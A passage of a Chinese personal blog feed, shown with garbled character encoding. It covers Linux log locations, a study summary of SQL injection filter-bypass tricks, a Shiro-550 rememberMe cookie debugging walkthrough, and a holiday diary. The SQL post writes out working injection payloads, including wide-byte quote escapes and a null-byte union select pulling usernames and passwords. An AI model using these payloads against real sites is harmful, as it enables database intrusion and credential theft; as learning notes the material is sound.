href="#Linuxæ—¥å¿—æŸ¥è¯¢" class="headerlink" title="Linuxæ—¥å¿—æŸ¥è¯¢"></a>Linuxæ—¥å¿—æŸ¥è¯¢</h2><ul><li>&#x2F;var&#x2F;log&#x2F;utmp è¿æ¥æ—¶é—´æ—¥å¿—ã€‚</li><li>&#x2F;var&#x2F;log&#x2F;lastlog æœ€åä¸€æ¬¡æˆåŠŸç™»å½•ç”¨æˆ·çš„æ—¶é—´å’ŒIP</li><li>&#x2F;var&#x2F;log&#x2F;messages linuxæ“ä½œç³»ç»Ÿå¸¸è§çš„ç³»ç»Ÿå’ŒæœåŠ¡é”™è¯¯</li><li>&#x2F;var&#x2F;log&#x2F;secure ç³»ç»Ÿå®‰å…¨æ—¥å¿—ï¼Œè®°å½•ç”¨æˆ·å’Œå·¥ä½œç»„å˜åã€ç”¨æˆ·ç™»å½•è®¤è¯çš„æƒ…å†µ</li><li>&#x2F;var&#x2F;log&#x2F;btmp è®°å½•ç”¨æˆ·ç™»å½•å¤±è´¥çš„æ—¶é—´ä»¥åŠip</li><li>&#x2F;var&#x2F;log&#x2F;cron è®°å½•crondè®¡åˆ’æœåŠ¡æ‰§è¡Œæƒ…å†µï¼ˆç›¸å½“äºæ˜¯ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼‰</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlæ³¨å…¥ç»•è¿‡æ€»ç»“</title>
    <link href="/2022/03/15/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <url>/2022/03/15/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="SQLæ³¨å…¥ç»•è¿‡æ€»ç»“"><a href="#SQLæ³¨å…¥ç»•è¿‡æ€»ç»“" class="headerlink" title="SQLæ³¨å…¥ç»•è¿‡æ€»ç»“"></a>SQLæ³¨å…¥ç»•è¿‡æ€»ç»“</h1><p>ä¸ºä»€ä¹ˆæ¥æ€»ç»“ä¸€ä¸‹è¿™ä¸ªå‘¢ï¼Ÿå› ä¸ºä»Šå¤©é¢è¯•çš„æ—¶å€™ï¼Œåˆæ˜¯è¿·è¿·ç³Šç³Šã€‚</p><h2 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>æ•°æ®åº“ä½¿ç”¨ä¸åŒºåˆ†å¤§å°å†™çš„æ–¹å¼æ¥å¤„ç†sqlå…³é”®å­—ã€‚</p><h3 id="åŒºåˆ†å¤§å°å†™çš„å‡½æ•°"><a href="#åŒºåˆ†å¤§å°å†™çš„å‡½æ•°" class="headerlink" title="åŒºåˆ†å¤§å°å†™çš„å‡½æ•°"></a>åŒºåˆ†å¤§å°å†™çš„å‡½æ•°</h3><p>eregï¼ˆï¼‰å‡½æ•°</p><p>preg_match_all()</p><p>preg_match()</p><p>strstr()</p><h2 id="æ··å†™ç»•è¿‡"><a href="#æ··å†™ç»•è¿‡" class="headerlink" title="æ··å†™ç»•è¿‡"></a>æ··å†™ç»•è¿‡</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">$str <span class="hljs-operator">=</span> &quot;select union * from &quot;;<br>$str1 <span class="hljs-operator">=</span> &quot;select ununionion * from &quot;;<br><br>$ptn <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;/uunionnion/&#x27;</span>;<br><br>$rep <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;union&#x27;</span>;<br><br>$str <span class="hljs-operator">=</span> preg_replace($ptn,$rep,$str);<br><br>echo $str;<br></code></pre></td></tr></table></figure><h2 id="å¸¸è§æ³¨é‡Šç¬¦"><a href="#å¸¸è§æ³¨é‡Šç¬¦" class="headerlink" title="å¸¸è§æ³¨é‡Šç¬¦"></a>å¸¸è§æ³¨é‡Šç¬¦</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">--+</span><br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨å•å¼•å·é—­åˆ"><a href="#ä½¿ç”¨å•å¼•å·é—­åˆ" class="headerlink" title="ä½¿ç”¨å•å¼•å·é—­åˆ"></a>ä½¿ç”¨å•å¼•å·é—­åˆ</h2><p>æ è¿‡ã€‚</p><h2 id="å•å¼•å·çš„ç»•è¿‡"><a href="#å•å¼•å·çš„ç»•è¿‡" class="headerlink" title="å•å¼•å·çš„ç»•è¿‡"></a>å•å¼•å·çš„ç»•è¿‡</h2><p><strong>å®½å­—èŠ‚æ³¨å…¥ã€‚</strong></p><p>è¿‡æ»¤ â€˜ çš„æ—¶å€™å¾€å¾€åˆ©ç”¨çš„æ€è·¯æ˜¯å°† â€˜ è½¬æ¢ä¸º\ &#39; ã€‚</p><p>åœ¨ mysql ä¸­ä½¿ç”¨ GBK ç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ€è·¯ï¼š</p><p>ï¼ˆ1ï¼‰%df åƒæ‰ \ å…·ä½“çš„æ–¹æ³•æ˜¯ urlencode(â€˜) &#x3D; %5c%27ï¼Œæˆ‘ä»¬åœ¨ %5c%27 å‰é¢æ·»åŠ  %df ï¼Œå½¢æˆ %df%5c%27 ï¼Œè€Œ mysql åœ¨ GBK ç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œ%df%5c å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ%27 ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ï¼ˆâ€™ï¼‰ç¬¦å·åœ¨å¤–é¢ã€‚</p><h2 id="é€—å·çš„è¿‡æ»¤"><a href="#é€—å·çš„è¿‡æ»¤" class="headerlink" title="é€—å·çš„è¿‡æ»¤"></a>é€—å·çš„è¿‡æ»¤</h2><p>å¯¹äº<strong>substr()<strong>å’Œ</strong>mid()</strong>:ä¸€ç§æˆªå–çš„ä½œç”¨ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> substr(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">select</span> mid(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>å¯¹äº<strong>limit</strong>å¯ä»¥ä½¿ç”¨<strong>offset</strong>æ¥ç»•è¿‡</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br># ç­‰ä»·äºä¸‹é¢è¿™æ¡<span class="hljs-keyword">SQL</span>è¯­å¥<br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> yang limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>     #ç­‰ä»·äº<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b<br></code></pre></td></tr></table></figure><h2 id="æ¯”è¾ƒç¬¦ï¼ˆ-lt-ã€-gt-ï¼‰è¿‡æ»¤"><a href="#æ¯”è¾ƒç¬¦ï¼ˆ-lt-ã€-gt-ï¼‰è¿‡æ»¤" class="headerlink" title="æ¯”è¾ƒç¬¦ï¼ˆ&lt;ã€&gt;ï¼‰è¿‡æ»¤"></a>æ¯”è¾ƒç¬¦ï¼ˆ&lt;ã€&gt;ï¼‰è¿‡æ»¤</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">64</span><br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)<span class="hljs-operator">=</span><span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><h2 id="æ¯”è¾ƒç¬¦ï¼ˆ-x3D-ï¼‰è¿‡æ»¤"><a href="#æ¯”è¾ƒç¬¦ï¼ˆ-x3D-ï¼‰è¿‡æ»¤" class="headerlink" title="æ¯”è¾ƒç¬¦ï¼ˆ&#x3D;ï¼‰è¿‡æ»¤"></a>æ¯”è¾ƒç¬¦ï¼ˆ&#x3D;ï¼‰è¿‡æ»¤</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>ä½¿ç”¨<span class="hljs-keyword">in</span>æ–¹æ³•ç»•è¿‡<br>ä½¿ç”¨ç¤ºä¾‹ï¼š<br>$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>);<br>ä½¿ç”¨<span class="hljs-keyword">like</span> ç»•è¿‡<br>$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">Where</span> id <span class="hljs-keyword">like</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"> <span class="hljs-keyword">between</span> a <span class="hljs-keyword">and</span> bï¼š<br><br><span class="hljs-keyword">between</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>; ç­‰ä»·äº <span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="oræˆ–andè¿‡æ»¤"><a href="#oræˆ–andè¿‡æ»¤" class="headerlink" title="oræˆ–andè¿‡æ»¤"></a>oræˆ–andè¿‡æ»¤</h2><p>||ã€&amp;&amp;</p><h2 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h2><p>()</p><p>å†…è”æ³¨é‡Š<br><strong>&#x2F;</strong>&#x2F;**<br>ä»¥åŠ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/*!å…³é”®å­—*/</span><br></code></pre></td></tr></table></figure><p>%0a(URLç¼–ç ä¸­çš„ç©ºæ ¼)ã€‚</p><p>&#96;(tapé”®ä¸Šé¢çš„æŒ‰é’®)ã€‚</p><p>tap</p><h2 id="è§£ææ¼æ´ç»•è¿‡"><a href="#è§£ææ¼æ´ç»•è¿‡" class="headerlink" title="è§£ææ¼æ´ç»•è¿‡"></a>è§£ææ¼æ´ç»•è¿‡</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">index.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">2</span>è¿™æ ·çš„urlåœ¨ä¸Šå›¾çš„ç¯å¢ƒä¸‹æœ€ç»ˆè¿”å›çš„æ•°æ®id<span class="hljs-operator">=</span><span class="hljs-number">2</span>çš„æ•°æ®ã€‚<br><br>å®¢æˆ·ç«¯è¯·æ±‚å…ˆåˆ°tomcatï¼Œtomcatè§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¥ä¸‹æ¥tomcatå»è¯·æ±‚apacheï¼Œapacheè§£æç¬¬äºŒä¸ªå‚æ•°ã€‚å› ä¸ºå®é™…ä¸Šæä¾›æœåŠ¡çš„æ˜¯apacheæœåŠ¡å™¨ï¼Œè¿”å›æ•°æ®çš„ä¹Ÿæ˜¯apacheæœåŠ¡å™¨ã€‚<br></code></pre></td></tr></table></figure><h2 id="å¼•å·ç»•è¿‡"><a href="#å¼•å·ç»•è¿‡" class="headerlink" title="å¼•å·ç»•è¿‡"></a>å¼•å·ç»•è¿‡</h2><p>ä½¿ç”¨åå…­è¿›åˆ¶</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><br></code></pre></td></tr></table></figure><h2 id="åƒåœ¾æ•°æ®ç»•è¿‡"><a href="#åƒåœ¾æ•°æ®ç»•è¿‡" class="headerlink" title="åƒåœ¾æ•°æ®ç»•è¿‡"></a>åƒåœ¾æ•°æ®ç»•è¿‡</h2><p>åœ¨å¾ˆå¤šGETä¼ å‚çš„ç½‘ç«™ï¼Œè¿‡æ»¤å‡½æ•°å¯¹ä¼ å…¥çš„å†…å®¹æœ‰é•¿åº¦é™åˆ¶çš„æ—¶å€™ï¼Œä¼šå¯¼è‡´GETä¼ å…¥ä¸€äº›åƒåœ¾æ•°æ®çš„æ—¶å€™ï¼Œé•¿äºè¿‡æ»¤çš„é•¿åº¦çš„æ—¶å€™å°±å¯ä»¥å®ç°ç»•è¿‡ã€‚</p><h2 id="ç©ºå­—èŠ‚ç»•è¿‡"><a href="#ç©ºå­—èŠ‚ç»•è¿‡" class="headerlink" title="ç©ºå­—èŠ‚ç»•è¿‡"></a>ç©ºå­—èŠ‚ç»•è¿‡</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">é€šå¸¸çš„è¾“å…¥è¿‡æ»¤å™¨éƒ½æ˜¯åœ¨åº”ç”¨ç¨‹åºä¹‹å¤–çš„ä»£ç å®ç°çš„ã€‚æ¯”å¦‚å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ(IDS)ï¼Œè¿™äº›ç³»ç»Ÿä¸€èˆ¬æ˜¯ç”±åŸç”Ÿç¼–ç¨‹è¯­è¨€å¼€å‘è€Œæˆçš„ï¼Œæ¯”å¦‚c<span class="hljs-operator">+</span><span class="hljs-operator">+</span>ï¼Œä¸ºä»€ä¹ˆç©ºå­—èŠ‚èƒ½èµ·ä½œç”¨å‘¢ï¼Ÿå°±æ˜¯å› ä¸ºåœ¨åŸç”Ÿç¼–ç¨‹è¯­è¨€ä¸­ï¼Œæ ¹æ®å­—ç¬¦ä¸²èµ·å§‹ä½ç½®åˆ°ç¬¬ä¸€ä¸ªå‡ºç°ç©ºå­—èŠ‚çš„ä½ç½®æ¥ç¡®å®šå­—ç¬¦ä¸²é•¿åº¦ï¼Œæ‰€ä»¥è¯´ç©ºå­—èŠ‚å°±æœ‰æ•ˆç»ˆæ­¢äº†å­—ç¬¦ä¸²ã€‚<br><br>åªéœ€è¦åœ¨è¿‡æ»¤å™¨ç»„ç»‡çš„å­—ç¬¦ä¸²å‰é¢æä¾›ä¸€ä¸ªé‡‡ç”¨URLç¼–ç çš„ç©ºå­—èŠ‚å³å¯ï¼Œä¾‹å¦‚ï¼š<br><br><span class="hljs-number">1.</span><span class="hljs-operator">%</span><span class="hljs-number">00</span><span class="hljs-string">&#x27; union select username,password from users where username=&#x27;</span>admin<span class="hljs-string">&#x27; --</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SQL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro550</title>
    <link href="/2022/03/14/Shiro550/"/>
    <url>/2022/03/14/Shiro550/</url>
    
    <content type="html"><![CDATA[<h1 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h1><p>å®‰è£…ç¯å¢ƒæ˜¯çœŸçš„å¤´ç–¼ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apache/</span>shiro.git<br>cd shiro<br>git checkout shiro-root-<span class="hljs-number">1.2</span>.<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°†samples&#x2F;webæ–‡ä»¶æ‹–å…¥è¿›ideaã€‚ç„¶åä¼šæœ‰äº›æŠ¥é”™å•¥çš„æƒ…å†µï¼Œåæ­£å¼„äº†åŠå¤©å¾ˆå¤´ç–¼ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053356.png" alt="QQæˆªå›¾20220313222244"></p><p>æŠ“åŒ…ä¸€ä¸‹å¾—åˆ°ï¼š<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053799.png" alt="QQæˆªå›¾20220313225727"></p><h2 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142003271.png" alt="QQæˆªå›¾20220314200304"></p><p>å®˜æ–¹è¯´çš„æ˜¯<strong>CookieRememberMeManager</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053853.png" alt="QQæˆªå›¾20220314200414"></p><p>ä¸‹å…¥æ–­ç‚¹<strong>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</strong></p><p>è·Ÿè¿›ä¸€ä¸‹åŠ å¯†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053927.png" alt="QQæˆªå›¾20220314200541"></p><p>ç®€å•è·Ÿäº†ä¸€ä¸‹æµç¨‹ã€‚<br>è¿™é‡Œå¯ä»¥å…¶å¯†é’¥ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142018769.png"></p><p>æœ€åä¼šå°†åŠ å¯†çš„ä¸œè¥¿å†™å…¥cookieã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053515.png" alt="QQæˆªå›¾20220314201754"></p><p>æŠ“åŒ…çœ‹ä¸€ä¸‹ã€‚</p><p>é‚£ä¹ˆå¯ä»¥æ¥åˆ†æä¸€ä¸‹æµç¨‹ã€‚ä¸­é—´æœ‰äº›ä¸æƒ³æˆªå›¾ï¼Œtomcatè°ƒè¯•çœŸçš„å¤´ç–¼ã€‚</p><ul><li>å…ˆå°†ç”¨æˆ·åºåˆ—åŒ–æˆæ•°ç»„ã€‚</li><li>å¯¹å…¶ä½¿ç”¨aseåŠ å¯†ï¼ˆå”¯ä¸€å¯†é’¥ä¸”æˆ‘ä»¬å¯çŸ¥ï¼‰ã€‚</li><li>base64ç¼–ç ã€‚</li><li>å†™å…¥cookieçš„remembermeå­—æ®µã€‚</li></ul><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><p>ä¸‹å…¥æ–­ç‚¹<strong>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</strong></p><p>è·Ÿè¿›ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053541.png" alt="QQæˆªå›¾20220314203449"></p><p>è·å–cookieå†…å®¹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053502.png" alt="QQæˆªå›¾20220314203529"></p><p>å¹¶ä¸”è¿›è¡Œbase64è§£ç ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053022.png" alt="QQæˆªå›¾20220314203606"></p><p>ç»§ç»­è·Ÿè¿›ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053805.png" alt="QQæˆªå›¾20220314203725"></p><p>æ€»ç»“ï¼š</p><ul><li>è·å–cookieå€¼</li><li>base64è§£ç </li><li>aesè§£å¯†</li><li>ååºåˆ—åŒ–</li></ul><p>è¿™é‡Œå¦‚ä½•è°ƒè¯•ã€‚</p><p>1ã€å¯åŠ¨tomcatç¬¬ä¸€æ¬¡ç™»é™†æ³¨å†Œï¼Œé’©ä¸ŠrememberMeï¼Œä¹‹åæ­£å¸¸ç™»é™†ï¼ŒæŠ“åŒ…ç•™å­˜</p><p>2ã€åœ¨è§£å¯†è¿™é‡Œä¸‹æ–­ç‚¹ï¼Œåœ¨ç™»å½•çŠ¶æ€ä¸‹ï¼Œåˆ é™¤JSESSIONIDå­—æ®µï¼Œå‘é€ç¬¬ä¸€æ­¥ä¿å­˜çš„æ•°æ®åŒ…ï¼Œå°±å¯è§£å¯†ã€‚</p><p>ç®—æ˜¯å¤ä¹ ä¸€é“å§ï¼Œä»¥åç¢°åˆ°è¿™ç§ç±»å‹çš„é¢˜æœ‰æ€è·¯ã€‚æ’¤äº†ã€‚ä»¥åç¢°åˆ°è¿™ç§é¢˜ä»¥åèƒ½å¤Ÿåº”å¯¹ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Shiro</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç™½è‰²æƒ…äººèŠ‚</title>
    <link href="/2022/03/14/%E7%99%BD%E8%89%B2%E6%83%85%E4%BA%BA%E8%8A%82/"/>
    <url>/2022/03/14/%E7%99%BD%E8%89%B2%E6%83%85%E4%BA%BA%E8%8A%82/</url>
    
    <content type="html"><![CDATA[<h1 id="ç™½è‰²æƒ…äººèŠ‚"><a href="#ç™½è‰²æƒ…äººèŠ‚" class="headerlink" title="ç™½è‰²æƒ…äººèŠ‚"></a>ç™½è‰²æƒ…äººèŠ‚</h1><p>å“ªé‡Œæ¥çš„è¿™ä¹ˆå¤šæƒ…äººèŠ‚ï¼Ÿï¼Ÿä¸è¿‡åˆšå¥½è®°å½•ä¸‹ï¼Œä¸Šå‘¨æœ«å‡ºå»happyçš„ä¸¤å¤©ã€‚</p><p>å¥½ä¹…æ²¡è§é¢äº†ï¼Œå®è´æ‰äº†ä¸ªé©¬å°¾ã€‚åœ¨è€åœ°æ–¹è§é¢ï¼Œå”‰å“Ÿçœ‹äº†å¥½å‡ çœ¼éƒ½æ²¡è®¤å‡ºæ¥ï¼ˆä¸€å®šæ˜¯å¤ªä¹…æ²¡è§çš„åŸå› ï¼Œæˆ–è€…è´è´å˜å¾—æ›´å¥½çœ‹äº†~ï¼‰ã€‚ç„¶åå°±å»é€›è¡—ã€‚å—¯ï¼ŒEMMMï¼ˆç”·ç”Ÿå°±æ˜¯å·¥å…·äººï¼Œèº«ä¸Šå…¨æ˜¯åŒ…ï¼‰ã€‚è™½ç„¶å¿«ä¹ï¼Œä½†æ˜¯å¥½ç´¯ã€‚æˆ‘è„šä¸«å­è¿˜èµ·äº†æ°´æ³¡ã€‚ï¼ï¼ï¼ï¼å›åˆ°å­¦æ ¡æ‰å‘ç°ã€‚</p><p>æ„Ÿè§‰æ¯æ¬¡å‡ºå»ç©éƒ½æ˜¯åœ¨åƒåƒåƒåƒã€‚è¿™ä¸è¿™æ¬¡åˆåƒäº†è¿™ä¹ˆå¤šã€‚<br>å…ˆæ¥çœ‹çœ‹å–çš„ã€‚</p><h2 id="å°ç¾äºº"><a href="#å°ç¾äºº" class="headerlink" title="å°ç¾äºº"></a>å°ç¾äºº</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142007206.jpg"></p><h2 id="æ°‘å®¿"><a href="#æ°‘å®¿" class="headerlink" title="æ°‘å®¿"></a>æ°‘å®¿</h2><p>çœ‹äº†<strong>çœ‹ä¸è§çš„å®¢äºº</strong>ï¼ˆç»è¿‡å®è´çš„çº æ­£ï¼‰ï¼Œè¡¨ç¤ºæ™šä¸Šçœ‹ï¼Œæˆ‘ä¹Ÿæœ‰äº›å®³æ€•~ï¼ï¼ˆæ²¡æœ‰æ‹ç…§è®°å½•ã€‚ï¼‰</p><h2 id="é¥®æ–™"><a href="#é¥®æ–™" class="headerlink" title="é¥®æ–™"></a>é¥®æ–™</h2><p>ç”Ÿç†æœŸè¿˜æ˜¯å–äº†å¾ˆå¤šå†°çš„ã€‚å¸Œæœ›ä»¥åæ¥å§¨å¦ˆè‚šå­ç–¼åˆ«æ‰¾æˆ‘ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141741811.jpg" alt="8e7fdaa7faa23c697e3ee273c40d2cc"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141741405.jpg" alt="1034252e7240e9a99c788e499b81cf7"></p><p>äº›è®¸æ½¦è‰çš„ç»¿å’Œç´«ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141742949.jpg" alt="1e68af5958d7432c513f0048eeed19d"></p><h2 id="åƒ"><a href="#åƒ" class="headerlink" title="åƒ"></a>åƒ</h2><h3 id="çƒ¤åŒ "><a href="#çƒ¤åŒ " class="headerlink" title="çƒ¤åŒ "></a>çƒ¤åŒ </h3><p>åƒè¿‡å¾ˆå¤šæ¬¡äº†ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½æ„Ÿè§‰è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„å¥½åƒã€‚è¿˜åƒäº†ä¸ªç”Ÿèšã€‚ç„¶å3minä¸­kouâ€™ganå£æ„Ÿæœ€ä½³çš„è±†è…ã€‚æœ€ååº”è¯¥æ˜¯è¢«æˆ‘ä¸€ä¸ªäººåƒå®Œäº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141743915.jpg" alt="5f4443b2c2ef8e2f55345edec469423"></p><h3 id="æ±Ÿå—"><a href="#æ±Ÿå—" class="headerlink" title="æ±Ÿå—"></a>æ±Ÿå—</h3><p>è‚¥è€Œä¸è…»çš„ä¸œå¡è‚‰ã€‚ä½†æ˜¯ç”±äºæ²¡æœ‰è§£è…»èœã€‚å®è´åƒä¸äº†å¤ªå¤šï¼ŒåŸºæœ¬è¢«æˆ‘ä¸€ä¸ªäººå¹²å®Œäº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141745074.jpg" 